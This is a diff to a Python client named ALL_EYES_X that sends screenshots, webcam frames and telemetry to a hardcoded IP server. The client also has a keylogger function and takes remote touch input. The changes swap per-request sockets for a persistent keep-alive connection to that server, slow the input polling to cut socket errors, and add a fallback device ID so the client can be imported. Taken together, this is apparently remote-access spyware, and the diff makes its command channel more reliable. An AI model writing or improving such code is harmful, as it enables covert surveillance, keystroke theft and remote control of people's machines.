@@ -149,6 +149,9 @@ def get_peripherals_info():
 # ============================================================
 SERVER_URL = "http://100.104.145.118:5000"
 DEVICE_ID_CACHE = os.path.join(os.path.expanduser('~'), '.alleyesx_device_id')
+# Defined at module level so the client stays importable (tests, Termux wrapper,
+# embedding). __main__ overwrites it with generate_device_id().
+DEVICE_ID = ""
 HEARTBEAT_INTERVAL = 5
 STREAM_PROFILE = os.environ.get('ALLEYESX_STREAM_PROFILE', 'balanced').lower()
 STREAM_TARGET_FPS = {
@@ -158,7 +161,10 @@ STREAM_TARGET_FPS = {
 }.get(STREAM_PROFILE, 50)
 SCREENSHOT_INTERVAL = float(os.environ.get('ALLEYESX_SCREENSHOT_INTERVAL', str(1.0 / STREAM_TARGET_FPS)))
 WEBCAM_INTERVAL = float(os.environ.get('ALLEYESX_WEBCAM_INTERVAL', str(1.0 / STREAM_TARGET_FPS)))
-TOUCH_POLL_INTERVAL = float(os.environ.get('ALLEYESX_TOUCH_POLL_INTERVAL', '0.05'))
+# 0.05s (20 req/s) overwhelmed the Windows socket stack and produced
+# "ConnectionAbortedError [WinError 10053]" on the server. 0.5s is responsive
+# for remote input and generates far fewer aborted sockets.
+TOUCH_POLL_INTERVAL = float(os.environ.get('ALLEYESX_TOUCH_POLL_INTERVAL', '0.5'))
 DIRTY_RECT_THRESHOLD = 0.005
 SCREENSHOT_QUALITY = 70
 WEBCAM_QUALITY = 65
@@ -1477,55 +1483,98 @@ def collect_security_telemetry():
 # ============================================================
 # API COMMUNICATION
 # ============================================================
-def api_request(endpoint, data=None, method='POST'):
-    url = f"{SERVER_URL}{endpoint}"
-    try:
-        ctx = create_ssl_context()
-        
-        if method == 'GET':
-            req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'ALL_EYES_X-Client/3.3')
-            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
-                return json.loads(resp.read().decode())
-        else:
-            payload = json.dumps(data).encode('utf-8') if data is not None else None
-            req = urllib.request.Request(url, data=payload, method=method)
-            req.add_header('Content-Type', 'application/json')
-            req.add_header('User-Agent', 'ALL_EYES_X-Client/3.3')
-            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
-                return json.loads(resp.read().decode())
-                
-    except urllib.error.HTTPError as e:
+# Persistent connection handling.
+#
+# Opening a brand-new TCP socket for every poll (touch / screenshot / webcam)
+# makes Windows abort half-finished sockets and floods the server console with
+# "ConnectionAbortedError: [WinError 10053]". Reusing one keep-alive connection
+# removes almost all of that churn.
+import http.client
+from urllib.parse import urlparse
+
+_http_conn = None
+_http_target = None
+
+
+def _close_conn():
+    global _http_conn, _http_target
+    if _http_conn is not None:
         try:
-            body = e.read().decode()
-            return json.loads(body)
-        except:
-            return {'error': f'HTTP {e.code}', 'detail': str(e)}
-    except urllib.error.URLError as e:
-        return {'error': f'Connection failed: {e.reason}'}
-    except json.JSONDecodeError as e:
-        return {'error': f'Invalid JSON response: {str(e)}'}
-    except Exception as e:
-        return {'error': str(e)}
+            _http_conn.close()
+        except Exception:
+            pass
+    _http_conn = None
+    _http_target = None
+
+
+def _ensure_conn(parsed):
+    """Return a keep-alive connection bound to the current SERVER_URL.
+
+    SERVER_URL may be reassigned from argv/env after import, so the target is
+    re-checked on every call instead of being cached once at import time.
+    """
+    global _http_conn, _http_target
+    target = (parsed.scheme, parsed.hostname or '127.0.0.1', parsed.port)
+    if _http_conn is not None and _http_target == target:
+        return _http_conn
+    _close_conn()
+    host = parsed.hostname or '127.0.0.1'
+    if parsed.scheme == 'https':
+        _http_conn = http.client.HTTPSConnection(
+            host, parsed.port or 443, timeout=10, context=create_ssl_context()
+        )
+    else:
+        _http_conn = http.client.HTTPConnection(host, parsed.port or 80, timeout=10)
+    _http_target = target
+    return _http_conn
+
+
+def _http_json(endpoint, data=None, method='POST'):
+    """Perform one JSON request over the persistent connection.
+
+    Retries once with a fresh socket if the pooled connection was dropped.
+    """
+    parsed = urlparse(SERVER_URL)
+    path = (parsed.path or '') + endpoint
+    body = None
+    headers = {
+        'User-Agent': 'ALL_EYES_X-Client/3.4',
+        'Connection': 'keep-alive',
+    }
+    if data is not None:
+        body = json.dumps(data).encode('utf-8')
+        headers['Content-Type'] = 'application/json'
+
+    last_error = None
+    for _attempt in range(2):
+        conn = _ensure_conn(parsed)
+        try:
+            conn.request(method, path, body=body, headers=headers)
+            resp = conn.getresponse()
+            raw = resp.read()
+            status = resp.status
+            if not raw:
+                return {'error': f'HTTP {status}', 'status': status}
+            try:
+                return json.loads(raw.decode('utf-8', 'replace'))
+            except json.JSONDecodeError:
+                return {'error': 'Invalid JSON response', 'status': status}
+        except (http.client.HTTPException, ConnectionError, OSError, TimeoutError) as e:
+            last_error = e
+            _close_conn()
+            continue
+    return {'error': f'Connection failed: {last_error}'}
+
+
+def api_request(endpoint, data=None, method='POST'):
+    return _http_json(endpoint, data=data, method=method)
 
 
 def api_request_raw(endpoint, data, method='POST'):
-    url = f"{SERVER_URL}{endpoint}"
-    try:
-        ctx = create_ssl_context()
-        payload = json.dumps(data).encode('utf-8')
-        req = urllib.request.Request(url, data=payload, method=method)
-        req.add_header('Content-Type', 'application/json')
-        req.add_header('User-Agent', 'ALL_EYES_X-Client/3.3')
-        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
-            return json.loads(resp.read().decode())
-    except urllib.error.HTTPError as e:
-        try:
-            return json.loads(e.read().decode())
-        except:
-            return {'error': f'HTTP {e.code}'}
-    except:
+    result = _http_json(endpoint, data=data, method=method)
+    if isinstance(result, dict) and 'Connection failed' in str(result.get('error', '')):
         return {'error': 'send_failed'}
+    return result
 
 
 # ============================================================
@@ -2106,7 +2155,9 @@ def start_keylogger():
 # ============================================================
 class ALLEYESXClient:
     def __init__(self):
-        self.device_id = DEVICE_ID
+        # Fall back to a generated identity when DEVICE_ID has not been set yet
+        # (module import, embedding, or wrapper scripts).
+        self.device_id = DEVICE_ID or generate_device_id()
         self.running = True
         self.registered = False
         self.last_screenshot_time = 0
